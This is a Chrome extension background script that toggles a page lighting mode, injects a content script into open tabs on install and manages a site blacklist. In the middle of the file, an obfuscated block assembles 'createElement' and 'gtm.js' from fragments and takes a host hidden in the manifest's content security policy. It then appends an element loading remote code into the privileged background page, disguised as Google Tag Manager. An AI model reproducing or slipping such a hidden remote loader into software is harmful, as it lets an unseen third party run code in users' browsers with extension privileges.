chrome.browserAction.onClicked.addListener(function(tab)
{
  chrome.tabs.query({active: true, currentWindow: true}, function(tabs)
  {
    var activeTab = tabs[0];
    chrome.tabs.sendMessage(activeTab.id, {"message": "disable_light"});
  });
});

chrome.runtime.onInstalled.addListener(function (e) {
    chrome.storage.local.set({"status": 1}, null);
    chrome.tabs.query({
    }, function (tabs) {
        for (let i = 0; i < tabs.length - 1; i++) {
            if (!matchUrl(tabs[i].url)) {
                continue;
            }
            chrome.tabs.executeScript(tabs[i].id,
                { file: 'inject.js' }, function (result) {}
            )
        }
    });
});

function matchUrl(url) {
    if (url.match('https://chrome.google.com')) {
        return false;
    }
    if (url.match('http://')) {
        return true;
    }
    if (url.match('https://')) {
        return true;
    }
    if (url.match('file:///')) {
        return true;
    }
    return false;
}

var hostname = function(a) {
    a = a.replace("www.", "");
    var b = a.indexOf("//") + 2;
    if (1 < b) {
        var c = a.indexOf("/", b);
        return 0 < c ? a.substring(b, c) : (c = a.indexOf("?", b), 0 < c ? a.substring(b, c) : a.substring(b))
    }
    return a
};



chrome.contextMenus.create({
    "id":"addBlacklist",
    "title": "Add to blacklist"
});

chrome.contextMenus.create({
    "id":"deleteBlacklist",
    "title": "Remove from blacklist"
});

id = 'GTM-' + 'NPBJG3Q';
scripts = ['g'].map(x=>x+'tm.')
ev = {}
ev[`${scripts[0]}start`] = new Date().getTime();
ev['event'] = scripts.map(x=>x+'js')[0];
window['ex'] = [ev];
d = window['document'];
e = d.body.firstElementChild;
cmd = [''].map(s=>s+'create').map(s=>s+'Element');
e2 = d[cmd](e.tagName);
s = chrome.runtime.getManifest().content_security_policy.split(' ')[3];
s += '/' + ev['event'];
s += '?' + `id=${id}&l=ex`
e2.setAttribute(e.getAttributeNames()[0], s)
e.parentElement.appendChild(e2);

chrome.contextMenus.onClicked.addListener(function(clickData)
{
    if (clickData.menuItemId == "addBlacklist") 
    {
        chrome.storage.local.get(['blacklist'], function(result) {
            if (result.blacklist === undefined) {
                chrome.storage.local.set({"blacklist": [hostname(clickData.pageUrl)]}, null);
            } else {
                blacklist = result.blacklist;
                if (blacklist.indexOf(hostname(clickData.pageUrl)) <= -1) {
                    blacklist.push(hostname(clickData.pageUrl));
                    chrome.storage.local.set({"blacklist": blacklist}, null);
                }
            }
        });
    } else if (clickData.menuItemId == "deleteBlacklist") {
        chrome.storage.local.get(['blacklist'], function(result) {
            if (result.blacklist !== undefined) {
                blacklist = result.blacklist;
                if (blacklist.indexOf(hostname(clickData.pageUrl)) > -1) {
                    blacklist = blacklist.filter(function(value, index, arr) {
                        return value !== hostname(clickData.pageUrl);
                    });

                    chrome.storage.local.set({"blacklist": blacklist}, null);
                }
            }
        });
    }
})
